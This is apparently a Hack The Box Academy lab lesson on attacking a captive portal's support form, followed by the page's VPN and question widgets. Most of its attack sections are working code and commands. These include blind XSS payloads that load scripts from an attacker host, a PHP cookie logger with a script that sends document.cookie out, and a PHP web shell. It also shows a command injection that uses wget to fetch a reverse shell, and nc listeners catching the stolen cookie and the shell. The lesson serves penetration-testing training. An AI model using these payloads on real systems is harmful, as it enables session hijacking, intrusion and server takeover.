
<h1>Portal Hijacking through XSS and Command Injection</h1>
<hr/>
<p>In some instances, captive portal systems may include a support form or other input-based features. If these forms lack proper input sanitization or security controls, they could be vulnerable to attacks like Cross-Site Scripting (XSS) or, in more severe cases, OS command injection. In this section, we will analyze a poorly implemented captive portal with a vulnerable support form. While real-world scenarios may vary, understanding these weaknesses can help identify similar vulnerabilities during security assessments.</p>
<p>Assume we navigate to the captive portal's sign-in page and notice the presence of a support section.</p>
<img class="website-screenshot" data-url="http://captive.htb.local" src="/storage/modules/299/xss/supportportal1.png"/>
<p>Upon clicking the support link, we might be redirected to an actual support form.</p>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/supportportal2.png"/>
<hr/>
<h1>Cross Site Scripting (XSS)</h1>
<p>Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious scripts into a trusted website. When a victim visits the compromised page, the malicious script runs in their browser, potentially stealing data, hijacking sessions, or performing unauthorized actions. We can test the support form of the captive portal to check if it is vulnerable to Cross Site Scripting (XSS). To learn more about XSS attacks, refer to the <a href="https://academy.hackthebox.com/module/details/103">Cross-Site Scripting (XSS)</a> module.</p>
<hr/>
<h3>Testing for Reflected XSS</h3>
<p>Reflected XSS vulnerabilities occur when our input reaches the back-end server and is returned without being filtered or sanitized. Often, our entire input might be reflected in error messages or confirmation messages. In such cases, we can test XSS payloads to check if they execute.</p>
<p>We can execute the following script to test if the support form is vulnerable to reflected XSS:</p>
<pre><code class="language-javascript">&lt;script&gt;alert("XSS Capable")&lt;/script&gt;
</code></pre>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/supportportal3.png"/>
<p>Depending on the results of our test, we might observe an alert prompt, indicating that the XSS payload has successfully executed.</p>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/supportportal4.png"/>
<hr/>
<h3>Testing for Blind XSS</h3>
<p>A Blind XSS vulnerability occurs when the injected payload is executed on a page that we do not have direct access to.</p>
<p>These vulnerabilities often exist in forms or inputs that are later viewed by privileged users, such as administrators. Some common examples include:</p>
<ul>
<li>Contact Forms</li>
<li>Reviews</li>
<li>User Details</li>
<li>Support Tickets</li>
<li>HTTP User-Agent Header</li>
</ul>
<p>Let's see if we can trigger some type of user interaction. Fill out all details for a ticket and include the following in the Message field:</p>
<pre><code class="language-javascript"> "&gt;&lt;script src=http://200.200.200.78:9200/TESTING_THIS&lt;/script&gt;
</code></pre>
<p>The script above includes our IP address on the captive portal's network. We then use nc to listen on the port specified in the script to check for a callback.</p>
<pre><code class="language-shell-session">[!bash!]$ nc -nvlp 9200

Listening on 0.0.0.0 9200
Connection received on 200.200.200.1 50220

GET /TESTING_THIS%3C/script HTTP/1.1
Host: 200.200.200.78:9200
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
</code></pre>
<p>This confirms that the form is vulnerable to a Blind XSS attack, meaning our payload executes on a page we do not have direct access to, such as an admin panel or internal system.</p>
<p>Various Blind XSS payloads often begin with an injection like <code>'&gt;</code>, which may or may not work depending on how the input is processed on the backend. To determine the correct XSS payload, we need to identify how user input is processed and reflected, as the page may be vulnerable, but a specific payload might not work. In such cases, a trial-and-error approach is necessary by testing multiple payloads and identifying which one successfully executes.</p>
<p>The following are a few more payload examples we can use for blind xss testing from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss">PayloadsAllTheThings</a>:</p>
<pre><code class="language-javascript">&lt;script src=http://OUR_IP&gt;&lt;/script&gt;
'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;
"&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();&lt;/script&gt;
&lt;script&gt;$.getScript("http://OUR_IP")&lt;/script&gt;
</code></pre>
<hr/>
<p>Now that we have confirmed the web page is vulnerable to XSS, we can explore how to leverage XSS in the context of a captive portal.</p>
<ol>
<li>
<code>Administrative Support</code>: Suppose that these requests are submitted here and also loaded via an admin page, we might be able to specially craft some javascript to have the Administrative cookie sent to us.</li>
<li>
<code>General Session Token/Cookie Usage</code>: Generally speaking, if this was something like a review page, which might be common in a guest network, we might receive client session tokens/cookies upon their visit to this page.</li>
</ol>
<hr/>
<h3>Cookie Jacking</h3>
<p>Next, we need to figure out how we can steal an admin's cookie so we can log in and see what type of access we can get. We can do this by creating the following two files:</p>
<ol>
<li>index.php</li>
</ol>
<pre><code class="language-php">&lt;?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key =&gt; $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?&gt;
</code></pre>
<ol start="2">
<li>script.js</li>
</ol>
<pre><code class="language-javascript">new Image().src='http://200.200.200.78:9200/index.php?c='+document.cookie
</code></pre>
<p>There are multiple JavaScript payloads we can use for <code>script.js</code> to grab the session cookie and have it sent to us, as shown by <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc">PayloadsAllTheThings</a>:</p>
<p>Subsequently, we should start a PHP web server on our attack host as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo php -S 0.0.0.0:9200
</code></pre>
<p>Finally, we create a new support ticket and submit the following in the message field:</p>
<pre><code class="language-javascript">"&gt;&lt;script src=http://200.200.200.78:9200/script.js&gt;&lt;/script&gt;
</code></pre>
<p>If an admin visits the page, we should receive a callback on our web server containing the admin's session cookie.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo php -S 0.0.0.0:9200

[Sat Mar  8 22:03:35 2025] PHP 8.1.2-1ubuntu2.20 Development Server (http://0.0.0.0:9200) starte
[Sat Mar  8 22:05:28 2025] 200.200.200.1:34898 Accepted
[Sat Mar  8 22:05:28 2025] 200.200.200.1:34898 [200]: GET /index.php?c=session=&lt;SNIP&gt;
</code></pre>
<p>This obtained cookie lets us log in as the admin.</p>
<img class="website-screenshot" data-url="http://captive.htb.local/dashboard.php" src="/storage/modules/299/xss/_005.PNG"/>
<hr/>
<h1>Command Injection</h1>
<p>Command Injection is a vulnerability that allows an attacker to execute arbitrary system commands on a server by injecting malicious input into a vulnerable application. This typically happens when user input is improperly sanitized before being passed to a system shell (bash, cmd, sh, etc.). We can test the support form of the captive portal to check if it is vulnerable to OS Command Injection. To learn more about this attack, refer to the <a href="https://academy.hackthebox.com/module/details/109">Command Injections</a> module.</p>
<hr/>
<h3>Evaluating user input as code</h3>
<p>When a form does not sanitize special characters and instead evaluates user input as code, we might be able to inject malicious PHP. This commonly happens when user submissions are rendered using the eval() function. In this scenario, any input stored in the $post variable is directly evaluated on the page. Since the page is running PHP, we could inject a simple payload to gain command execution on the machine.</p>
<p><code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/supportportal6.png"/>
<p>Suppose this input was accepted and no error was thrown. We could potentially visit the url with our ammendment at the end and the specification to execute the whoami command.</p>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/supportportal7.png"/>
<hr/>
<h3>Leveraging Operators</h3>
<p>For instances when user submissions are not directly executed as code, we can still attempt command injection by leveraging various operators. To inject an additional command to the intended one, we may use any of the following operators:</p>
<table>
<thead>
<tr>
<th><strong>Injection Operator</strong></th>
<th><strong>Injection Character</strong></th>
<th><strong>URL-Encoded Character</strong></th>
<th><strong>Executed Command</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Semicolon</td>
<td><code>;</code></td>
<td><code>%3b</code></td>
<td>Both</td>
</tr>
<tr>
<td>New Line</td>
<td><code>\n</code></td>
<td><code>%0a</code></td>
<td>Both</td>
</tr>
<tr>
<td>Background</td>
<td><code>&amp;</code></td>
<td><code>%26</code></td>
<td>Both (second output generally shown first)</td>
</tr>
<tr>
<td>Pipe</td>
<td><code>|</code></td>
<td><code>%7c</code></td>
<td>Both (only second output is shown)</td>
</tr>
<tr>
<td>AND</td>
<td><code>&amp;&amp;</code></td>
<td><code>%26%26</code></td>
<td>Both (only if first succeeds)</td>
</tr>
<tr>
<td>OR</td>
<td><code>||</code></td>
<td><code>%7c%7c</code></td>
<td>Second (only if first fails)</td>
</tr>
<tr>
<td>Sub-Shell</td>
<td><code>``</code></td>
<td><code>%60%60</code></td>
<td>Both (Linux-only)</td>
</tr>
<tr>
<td>Sub-Shell</td>
<td><code>$()</code></td>
<td><code>%24%28%29</code></td>
<td>Both (Linux-only)</td>
</tr>
</tbody>
</table>
<p>Imagine we come across a ticket form that accepts an IP address as input.</p>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/000.PNG"/>
<p>We can add a semi-colon after our input IP 200.200.200.78, and then append our command (e.g. whoami), such that the final payload we will use is <code>200.200.200.78; whoami</code>, and the final command to be executed would be:</p>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/001.PNG"/>
<p>If we execute a command and see its output reflected on the page, it confirms that we have successfully performed command injection.</p>
<img class="website-screenshot" data-url="http://captive.htb.local/support.php" src="/storage/modules/299/xss/002.PNG"/>
<hr/>
<h3>Gaining Persistence</h3>
<p>There are a few pre-requisites for an attack like this.</p>
<ol>
<li>The form needs to interpret user input as code.</li>
<li>The PHP script responsible for rendering this code needs to not break or truncate our submission.</li>
<li>The www-data account needs to have write privileges within /var/www/html or wherever the root web directory resides. This is not at all uncommon.</li>
<li>If write access is prohibited, we needs to be able to daisy chain commands to get to another writable directory. We can discover these through cd ../ and ls</li>
</ol>
<p>Once we know a writable directory, we can attempt to transfer a reverse shell to the server. We first want to find a nice PHP reverse shell to utilize. We can find one <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a>.</p>
<p>We should then modify a portion of its contents to where we can catch the reverse shell, triggered by visiting the page on the web server.</p>
<pre><code class="language-shell-session">[!bash!]$ cat rev.php

&lt;snip&gt;
set_time_limit (0);
$VERSION = "1.0";
$ip = '200.200.200.78';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
&lt;/snip&gt;
</code></pre>
<p>At this point, we might be able to transfer this reverse shell to the server. We need to start our listeners which consist of:</p>
<ol>
<li>Our HTTP server that the target captive portal server will download this file from</li>
<li>Our netcat listener that will catch the reverse shell</li>
</ol>
<pre><code class="language-shell-session">[!bash!]$ python3 -m http.server 5555

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:5555/) ...
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ nc -nvlp 4444 

Listening on 0.0.0.0 4444 
</code></pre>
<p>Next, we execute the following payload to download the reverse shell (rev.php) from our attacking machine and save it on the target system:</p>
<pre><code class="language-payload">200.200.200.78;wget http://200.200.200.78:5555/rev.php
</code></pre>
<img class="website-screenshot" data-url="http://captive.htb.local" src="/storage/modules/299/xss/rev.PNG"/>
<p>After that, we use another payload to list the files and confirm that rev.php has been successfully uploaded:</p>
<pre><code class="language-payload">200.200.200.78;ls
</code></pre>
<img class="website-screenshot" data-url="http://captive.htb.local" src="/storage/modules/299/xss/003.PNG"/>
<p>From the output, we can confirm that the reverse shell (rev.php) has been successfully uploaded to the target system.</p>
<p>Now, by visiting the URL where our reverse shell (rev.php) is hosted: <code>http://captive.htb.local/rev.php</code>, we trigger the payload, establishing a reverse shell connection to our attacking machine.</p>
<pre><code class="language-shell-session">[!bash!]$ nc -nvlp 4444 

Listening on 0.0.0.0 4444 
Connection received on 200.200.200.1 50108
Linux Captive 5.4.0-204-generic #224-Ubuntu SMP Thu Dec 5 13:38:28 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 23:07:31 up  3:43,  0 users,  load average: 0.23, 0.19, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data
</code></pre>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2990 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2990"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Perform an XSS attack on the captive portal to steal the admin's cookie as shown in the section. What is the stolen cookie value?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2990" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2990">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2990" id="btnAnswer2990">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2991 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2991"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Use the obtained cookie (PHPSESSID) to access /dashboard.php on the captive portal. What is the flag?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2991" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2991">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2991" id="btnAnswer2991">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2992 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2992"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Gain command execution on the captive portal and locate the flag at /opt/flag.txt. What is the flag?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2992" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2992">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2992" id="btnAnswer2992">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
